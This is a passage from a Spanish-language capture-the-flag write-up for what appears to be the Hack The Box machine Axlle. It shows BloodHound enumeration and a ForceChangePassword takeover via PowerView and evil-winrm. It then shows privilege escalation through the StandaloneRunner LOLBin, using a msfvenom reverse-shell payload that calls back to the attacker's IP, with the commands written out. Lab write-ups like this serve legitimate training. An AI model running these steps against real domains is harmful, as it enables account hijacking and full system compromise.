+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.20348.2527<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\&gt;</span>whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>axlle<span style="color:#ae81ff">\d</span>allon.matrix
+</span></span></code></pre></div><h1 id="user-pivoting-2">User Pivoting 2</h1>
+<p>Después de enumerar un rato la máquina, vamos a ejecutar BloodHound.
+Me copio el <code>SharpHound</code> a la máquina víctima.
+<code>C:\Users\dallon.matrix\Desktop&gt;copy \\10.10.14.80\smbFolder\SharpHound.exe SharpHound.exe</code></p>
+<p>Y simplemente lo ejecutamos
+<code>C:\Users\dallon.matrix\Desktop&gt;.\SharpHound.exe</code></p>
+<p>Y copiamos el resultado a nuestra máquina de atacante.
+<code>C:\Users\dallon.matrix\Desktop&gt;copy 20240802083534_BloodHound.zip \\10.10.14.80\smbFolder\20240802083534_BloodHound.zip</code></p>
+<p>Ahora abrimos el <code>bloodhound</code> y levantamos la BBDD de <code>neo4j</code> y seleccionamos el zip.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>Voy a marcar este usuario como <code>owned</code>
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>Pertenece a un grupo interesante, <code>APP DEVS@AXLLE.HTB</code>.</p>
+<p><img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<p>Los usuarios de este grupo pueden cambiar la contraseña a los usuarios
+<code>jacob.greeny</code> y a <code>baz.humphries</code>
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>Estos dos usuarios pertenecen a los mismos grupos, vamos a migrar a <code>jacob.greeny</code>.</p>
+<p>Además, estos usuarios están en el grupo de <code>Remote Management Users</code> por lo cual vamos a poder hacer uso de <code>evil-winrm</code> para conseguir una consola interactiva a través del protocolo WinRM.</p>
+<h1 id="abusing-forcechangepassword">Abusing ForceChangePassword</h1>
+<p>Antes de nada, he migrado a una shell de <code>nishang</code> para trabajar mas cómodamente.</p>
+<p>Ahora me comparto el <code>PowerView.ps1</code> y importamos sus módulos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\dallon.matrix\Desktop&gt; copy \\<span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">80</span>\smbFolder\PowerView.ps1 PowerView.ps1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:\Users\dallon.matrix\Desktop&gt; . .\PowerView.ps1
+</span></span></code></pre></div><p>Y ahora me puedo crear un nuevo objeto de <code>SecureString</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\dallon.matrix\Desktop&gt; $NewPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;Pointed123@&#39;</span> -AsPlainText -Force
+</span></span></code></pre></div><p>Y puedo cambiarle la credencial a <code>jacob.greeny</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\dallon.matrix\Desktop&gt; Set-DomainUserPassword -Identity <span style="color:#e6db74">&#39;jacob.greeny&#39;</span> -AccountPassword $NewPassword
+</span></span></code></pre></div><p>Con <code>netexec</code> podemos comprobar que hemos cambiado la credencial correctamente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.253.213 -u <span style="color:#e6db74">&#39;jacob.greeny&#39;</span> -p <span style="color:#e6db74">&#39;Pointed123@&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.253.213  <span style="color:#ae81ff">445</span>    MAINFRAME        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:MAINFRAME<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:axlle.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.253.213  <span style="color:#ae81ff">445</span>    MAINFRAME        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> axlle.htb<span style="color:#ae81ff">\j</span>acob.greeny:Pointed123@
+</span></span></code></pre></div><p>Y por alguna razón <code>netexec</code> me reporta que no tengo permisos para conectarme por WinRM</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc winrm 10.129.253.213 -u <span style="color:#e6db74">&#39;jacob.greeny&#39;</span> -p <span style="color:#e6db74">&#39;Pointed123@&#39;</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.253.213  <span style="color:#ae81ff">5985</span>   MAINFRAME        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MAINFRAME<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:axlle.htb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.253.213  <span style="color:#ae81ff">5985</span>   MAINFRAME        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> axlle.htb<span style="color:#ae81ff">\j</span>acob.greeny:Pointed123@
+</span></span></code></pre></div><p>pero <code>evil-winrm</code> demuestra lo contrario&hellip;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ evil-winrm -i 10.129.253.213 -u <span style="color:#e6db74">&#39;jacob.greeny&#39;</span> -p <span style="color:#e6db74">&#39;Pointed123@&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.5
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\j</span>acob.greeny<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>axlle<span style="color:#ae81ff">\j</span>acob.greeny
+</span></span></code></pre></div><h1 id="privilege-escalation---abusing-standalonerunner">Privilege Escalation - Abusing StandaloneRunner</h1>
+<p>Ahora que ya somos <code>jacob.greeny</code></p>
+<p>Antes, había visto un directorio al cual no podía acceder, ahora como este usuario si puedo acceder.
+<code>C:\App Development</code></p>
+<p>Nos encontramos un proyecto en <code>C#</code> llamado <code>kbfiltr</code> , leyendo el <code>README.md</code> encontramos esto que me llama la atención.</p>
+<pre tabindex="0"><code>**NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver in a standalone environment**
+</code></pre><p>Entonces si tuviera permisos de escritura en esa carpeta, podría reemplazar yo el binario por un payload hecho con <code>msfvenom</code> y supuestamente lo debería de ejecutar la cuenta administradora del sistema.</p>
+<p>Podemos comprobar los permisos con <code>icacls</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\App Development\kbfiltr&gt; icacls <span style="color:#e6db74">&#34;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64&#34;</span>
+</span></span><span style="display:flex;"><span>C:\Program Files (x86)\Windows Kits\<span style="color:#ae81ff">10</span>\Testing\StandaloneTesting\Internal\x64 AXLLE\App Devs<span style="color:#960050;background-color:#1e0010">:</span>(OI)(CI)(RX,W)
+</span></span><span style="display:flex;"><span>                                                                              Everyone<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(R)
+</span></span><span style="display:flex;"><span>                                                                              AXLLE\Administrator<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(F)
+</span></span><span style="display:flex;"><span>                                                                              BUILTIN\Users<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(R)
+</span></span><span style="display:flex;"><span>                                                                              AXLLE\App Devs<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(RX)
+</span></span><span style="display:flex;"><span>                                                                              NT SERVICE\TrustedInstaller<span style="color:#960050;background-color:#1e0010">:</span>(I)(F)
+</span></span><span style="display:flex;"><span>                                                                              NT SERVICE\TrustedInstaller<span style="color:#960050;background-color:#1e0010">:</span>(I)(CI)(IO)(F)
+</span></span><span style="display:flex;"><span>                                                                              NT AUTHORITY\SYSTEM<span style="color:#960050;background-color:#1e0010">:</span>(I)(F)
+</span></span><span style="display:flex;"><span>                                                                              NT AUTHORITY\SYSTEM<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(IO)(F)
+</span></span><span style="display:flex;"><span>                                                                              BUILTIN\Administrators<span style="color:#960050;background-color:#1e0010">:</span>(I)(F)
+</span></span><span style="display:flex;"><span>                                                                              BUILTIN\Administrators<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(IO)(F)
+</span></span><span style="display:flex;"><span>                                                                              BUILTIN\Users<span style="color:#960050;background-color:#1e0010">:</span>(I)(RX)
+</span></span><span style="display:flex;"><span>                                                                              BUILTIN\Users<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(IO)(GR,GE)
+</span></span><span style="display:flex;"><span>                                                                              CREATOR OWNER<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(IO)(F)
+</span></span><span style="display:flex;"><span>                                                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES<span style="color:#960050;background-color:#1e0010">:</span>(I)(RX)
+</span></span><span style="display:flex;"><span>                                                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(IO)(GR,GE)
+</span></span><span style="display:flex;"><span>                                                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES<span style="color:#960050;background-color:#1e0010">:</span>(I)(RX)
+</span></span><span style="display:flex;"><span>                                                                              APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES<span style="color:#960050;background-color:#1e0010">:</span>(I)(OI)(CI)(IO)(GR,GE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Successfully processed <span style="color:#ae81ff">1</span> files; Failed processing <span style="color:#ae81ff">0</span> files
+</span></span></code></pre></div><p>Y vemos que el siguiente permiso <code>AXLLE\App Devs:(OI)(CI)(RX,W)</code></p>
+<p>Esto significa que nuestro usuario, como pertenece al grupo <code>App Devs</code>, puede escribir en esa carpeta, por lo cual podríamos reemplazar el binario y escalar privilegios ya que según la nota, debe de haber una especie de tarea cron recurrente que ejecuta ese binario como el administrador.</p>
+<p>Creamos el binario malicioso con <code>msfvenom</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.80 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -e x86/shikata_ga_nai -f exe -o standalonerunner.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">1</span> compatible encoders
+</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">351</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">351</span>
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">351</span> bytes
+</span></span><span style="display:flex;"><span>Final size of exe file: <span style="color:#ae81ff">73802</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: standalonerunner.exe
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Program Files (x86)\Windows Kits\<span style="color:#ae81ff">10</span>\Testing\StandaloneTesting\Internal\x64&gt; upload standalonerunner.exe
+</span></span></code></pre></div><p>Nos venimos a la ruta <code>C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64</code> y subimos con la función <code>upload</code> que incluye <code>evil-wirnm</code> el binario malicioso recién creado.</p>
+<p>Y ahora si nos ponemos en escucha con <code>netcat</code> por el puerto 443&hellip;</p>
+<p><strong>NO PASA NADA</strong>
+¿Por qué?  -&gt; Por alguna razón, no podemos tocar el .exe, tenemos permisos sobre el directorio pero no sobre el .exe. Muchas personas han resuelto la máquina con este método pero resulta que no era el método intencionado y por eso fue parcheado.</p>
+<p>Así que vamos a hacer el método intencionado.</p>
+<p>Resulta que este binario pertenece a la colección de <code>LOLBins</code>, una colección de binarios que tienen comportamientos un poco extraños.</p>
+<p>Buscando un poco encontré un tweet que me llevó a este <a href="https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md">post</a></p>
+<p>Y parece que hay una función que te permitirían ejecutar comandos si existen unas condiciones.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> RunCommand(<span style="color:#66d9ef">string</span> cmd)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    cmd = TestRunnerUtil.ParseParams(cmd, TestRunner.GlobalParams);
+</span></span><span style="display:flex;"><span>    ProcessStartInfo startInfo = <span style="color:#66d9ef">new</span> ProcessStartInfo();
+</span></span><span style="display:flex;"><span>    startInfo.WorkingDirectory = TestRunner.WorkingDir.FullName;
+</span></span><span style="display:flex;"><span>    startInfo.UseShellExecute = <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    startInfo.RedirectStandardOutput = <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    startInfo.RedirectStandardError = <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    startInfo.FileName = <span style="color:#e6db74">&#34;CMD.exe&#34;</span>;
+</span></span><span style="display:flex;"><span>    startInfo.Arguments = <span style="color:#e6db74">&#34;cmd /c &#34;</span> + cmd;
+</span></span><span style="display:flex;"><span>    Console.WriteLine(<span style="color:#66d9ef">string</span>.Format((IFormatProvider) CultureInfo.CurrentCulture, <span style="color:#e6db74">&#34;Running {0}&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">object</span>[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        (<span style="color:#66d9ef">object</span>) cmd
+</span></span><span style="display:flex;"><span>    }));
+</span></span><span style="display:flex;"><span>    Process p = Process.Start(startInfo);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (cmd.Contains(<span style="color:#e6db74">&#34;te.exe&#34;</span>))
+</span></span><span style="display:flex;"><span>        TestRunner.RunTAEF(p);
+</span></span><span style="display:flex;"><span>    p.WaitForExit();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Primero nos copiamos los archivos <code>standalonerunner.exe</code> y <code>standalonexml.dll</code> a un directorio.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Program Files (x86)\Windows Kits\<span style="color:#ae81ff">10</span>\Testing\StandaloneTesting\Internal\x64&gt; copy * C:\Windows\Temp\work
+</span></span></code></pre></div><p>Tenemos que crear un archivo <code>reboot.rsf</code> que contenga lo siguiente para que el flujo del programa pase por donde nosotros queremos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat reboot.rsf 
+</span></span><span style="display:flex;"><span>myTestDir
+</span></span><span style="display:flex;"><span>True
+</span></span></code></pre></div><p>Ahora, para que en el método <code>MakeWorkingDir</code> la condición sea verdadera, tenemos que crear un par de directorios. El directorio <code>myTestDir</code> y dentro el directorio <code>working</code>.
+<code>C:\Windows\Temp\work\myTestDir\working</code></p>
+<p>Y ahora en el directorio donde se encuentra el <code>standalonerunner.exe</code> creamos un archivo <code>command.txt</code> con el comando que queremos ejecutar.</p>
+<p>En mi caso</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Windows\Temp\work\shell.exe
+</span></span></code></pre></div><p>Podemos comprobar que nos manda la reverse shell si ejecutamos el binario <code>standalonerunner.exe</code> y esperamos unos segundos.</p>
+<p>Ahora replicamos lo mismo en el directorio
+<code>C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64</code> ya que en principio <code>SYSTEM</code> está ejecutando el binario de forma periódica.
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Y nos ponemos en escucha con <code>netcat</code> por el puerto 443&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.80<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.253.213<span style="color:#f92672">]</span> <span style="color:#ae81ff">52156</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.20348.2527<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\W</span>indows Kits<span style="color:#ae81ff">\1</span>0<span style="color:#ae81ff">\T</span>esting<span style="color:#ae81ff">\S</span>tandaloneTesting<span style="color:#ae81ff">\I</span>nternal<span style="color:#ae81ff">\x</span>64<span style="color:#ae81ff">\m</span>yTestDir<span style="color:#ae81ff">\w</span>orking&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>axlle<span style="color:#ae81ff">\a</span>dministrator
+</span></span></code></pre></div><p>Y ya habríamos escalado privilegios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\Administrator\Desktop<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is BFF7-F940
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:\Users\Administrator\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>01/01/2024  04:45 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>01/02/2024  04:05 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>08/02/2024  05:19 AM                34 root.txt
+</span></span><span style="display:flex;"><span>               1 File(s)             34 bytes
+</span></span><span style="display:flex;"><span>               2 Dir(s)   2,924,068,864 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\Administrator\Desktop<span style="color:#75715e">&gt;type root.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> root.txt
+</span></span><span style="display:flex;"><span>513f9092e0147eb40...
+</span></span></code></pre></div><p>¡Y ya estaría!
+Una máquina bastante chula donde se aprenden un montón de conceptos nuevos, he disfrutado mucho completandola.</p>
+<p>Happy Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
